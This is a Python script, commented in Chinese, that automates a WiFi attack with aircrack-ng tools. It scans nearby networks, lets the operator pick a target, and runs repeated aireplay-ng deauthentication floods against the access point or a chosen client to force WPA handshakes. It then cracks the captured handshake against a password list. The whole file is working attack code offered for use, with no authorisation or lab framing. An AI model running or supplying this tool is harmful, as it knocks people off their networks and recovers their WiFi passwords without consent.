import subprocess
import time
import os
import sys
import glob
import csv
import threading
import shutil

# --- 全局配置 ---
INTERFACE = "wlan0mon"
PHY_INTERFACE = "wlan0"  # 物理网卡名
# 颜色代码
G = '\033[92m'  # 绿
R = '\033[91m'  # 红
Y = '\033[93m'  # 黄
B = '\033[94m'  # 蓝
W = '\033[0m'   # 白

stop_attack_event = threading.Event()

def clean_path_input(path_str):
    """清洗拖拽文件产生的引号和空格"""
    if not path_str: return ""
    return path_str.strip().strip('"\' ')

def run_cmd(command, show_output=False):
    if show_output:
        subprocess.run(command, shell=True)
    else:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def force_cleanup():
    """
    【核心修改】强制清理所有临时文件
    防止 handshake-01, 02, 03 堆积导致读取错误
    """
    print(f"{Y}[*] 正在清理历史残留文件...{W}")
    # 定义要删除的文件特征
    patterns = [
        "handshake-*.cap", 
        "handshake-*.csv", 
        "handshake-*.netxml", 
        "handshake-*.kismet.*",
        "scan_result-*"
    ]
    
    count = 0
    for pattern in patterns:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
                count += 1
            except:
                pass
    if count > 0:
        print(f"{G}[*] 已删除 {count} 个旧文件，环境已重置。{W}")

def reset_monitor_mode():
    """重置网卡状态"""
    print(f"{Y}[*] 正在重置网卡 (解决信道锁定问题)...{W}")
    run_cmd(f"sudo airmon-ng stop {INTERFACE}")
    time.sleep(1)
    run_cmd(f"sudo airmon-ng start {PHY_INTERFACE}")
    time.sleep(1)
    print(f"{G}[*] 网卡重置完毕。{W}")

def restore_network():
    """恢复网络"""
    print(f"\n{Y}[*] 正在恢复正常上网...{W}")
    stop_attack_event.set()
    run_cmd(f"sudo airmon-ng stop {INTERFACE}")
    run_cmd(f"sudo airmon-ng stop {PHY_INTERFACE}")
    run_cmd("sudo systemctl restart NetworkManager")
    # 退出前最后清理一次垃圾文件
    force_cleanup()
    print(f"{G}[OK] 网络已恢复。{W}")

def get_sorted_targets():
    """扫描并返回目标"""
    # 扫描前清理扫描缓存
    for f in glob.glob("scan_result-*"):
        os.remove(f)
    
    print(f"{Y}[!] 正在扫描 WiFi (约 8 秒)...{W}")
    cmd = ["sudo", "airodump-ng", "-w", "scan_result", "--output-format", "csv", INTERFACE]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(8)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        proc.wait()

    wifi_list = []
    try:
        csv_files = glob.glob("scan_result-*.csv")
        if not csv_files: return None, None
        
        with open(csv_files[0], 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) < 14 or row[0].strip() == 'BSSID': continue
                if row[0].strip() == 'Station MAC': break
                
                bssid = row[0].strip()
                try: pwr = int(row[8].strip())
                except: pwr = -100
                essid = row[13].strip()
                
                if pwr != -1 and essid: 
                    wifi_list.append({'bssid': bssid, 'ch': row[3].strip(), 'pwr': pwr, 'ssid': essid})
    except: return None, None

    wifi_list.sort(key=lambda x: x['pwr'], reverse=True)

    print(f"\n{G}--- 扫描结果 ---{W}")
    print(f"{'ID':<4} {'PWR':<6} {'CH':<4} {'BSSID':<20} {'SSID'}")
    print("-" * 60)
    for idx, w in enumerate(wifi_list):
        c = G if w['pwr'] > -60 else W
        print(f"{c}{idx:<4} {w['pwr']:<6} {w['ch']:<4} {w['bssid']:<20} {w['ssid']}{W}")
    
    choice = input(f"\n{Y}输入ID选择 (回车刷新, q退出): {W}").strip()
    if choice == 'q': return 'quit', 'quit'
    if not choice: return 'refresh', 'refresh'
    
    if choice.isdigit() and int(choice) < len(wifi_list):
        return wifi_list[int(choice)]['bssid'], wifi_list[int(choice)]['ch']
    return None, None

def attack_thread(bssid, client_mac):
    while not stop_attack_event.is_set():
        if client_mac:
            subprocess.run(["sudo", "aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client_mac, INTERFACE], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(["sudo", "aireplay-ng", "--deauth", "5", "-a", bssid, INTERFACE], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

def main():
    if os.geteuid() != 0:
        print(f"{R}请用 sudo 运行{W}"); sys.exit()

    # 1. 启动时先清理一次
    force_cleanup()

    print(f"{G}[*] 初始化环境...{W}")
    run_cmd("sudo airmon-ng check kill")
    run_cmd(f"sudo airmon-ng start {PHY_INTERFACE}")

    while True:
        reset_monitor_mode()
        target_bssid, target_channel = get_sorted_targets()
        
        if target_bssid == 'quit': break
        if target_bssid == 'refresh': continue
        if not target_bssid: continue

        # 2. 每次进入抓包流程前，再次强制清理 handshake 文件
        # 这样确保每次生成的一定是 handshake-01.cap
        force_cleanup()
        
        filename = "handshake"
        current_client = None 
        
        while True:
            print(f"\n{Y}[!] 正在抓包 (信道 {target_channel})... 按 {R}Ctrl+C{Y} 呼出菜单{W}")
            
            stop_attack_event.clear()
            t = threading.Thread(target=attack_thread, args=(target_bssid, current_client))
            t.daemon = True
            t.start()

            try:
                subprocess.run(["sudo", "airodump-ng", "-w", filename, "-c", target_channel, "--bssid", target_bssid, INTERFACE])
            except KeyboardInterrupt:
                pass 

            stop_attack_event.set()
            t.join()
            print("\n")

            print(f"{B}=== 菜单 (当前目标: {target_bssid}) ==={W}")
            print(f"1. {Y}指定 MAC 精准攻击{W}")
            print(f"2. {Y}使用密码本破解{W}")
            print(f"3. {Y}返回扫描列表{W} (会清理当前文件)")
            print(f"4. {G}继续抓包{W} (不清理，继续追加)")
            print(f"5. {R}退出{W}")
            
            op = input("请选择: ").strip()

            if op == '1':
                current_client = input("请输入客户端 MAC: ").strip()
                if len(current_client) < 17: current_client = None
            
            elif op == '2':
                # 因为我们前面做了 force_cleanup，所以文件永远是 -01.cap
                cap_file = f"{filename}-01.cap"
                if not os.path.exists(cap_file):
                    print(f"{R}[!] 未找到文件，请先抓包{W}")
                    time.sleep(1)
                else:
                    wordlist_raw = input("请拖入密码本文件: ")
                    wordlist = clean_path_input(wordlist_raw)
                    if os.path.exists(wordlist):
                        print(f"{G}[*] 开始破解...{W}")
                        try:
                            subprocess.run(["sudo", "aircrack-ng", cap_file, "-w", wordlist])
                        except Exception as e:
                            print(f"{R}破解出错: {e}{W}")
                        input(f"\n{Y}按回车键返回...{W}")
                    else:
                        print(f"{R}[!] 密码本路径无效{W}")
                        time.sleep(1)

            elif op == '3':
                # 返回上级时，清理掉刚才没用的包
                force_cleanup()
                break 

            elif op == '5':
                restore_network()
                sys.exit()
            
            # 选 4 继续循环，不清理文件

    restore_network()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        restore_network()
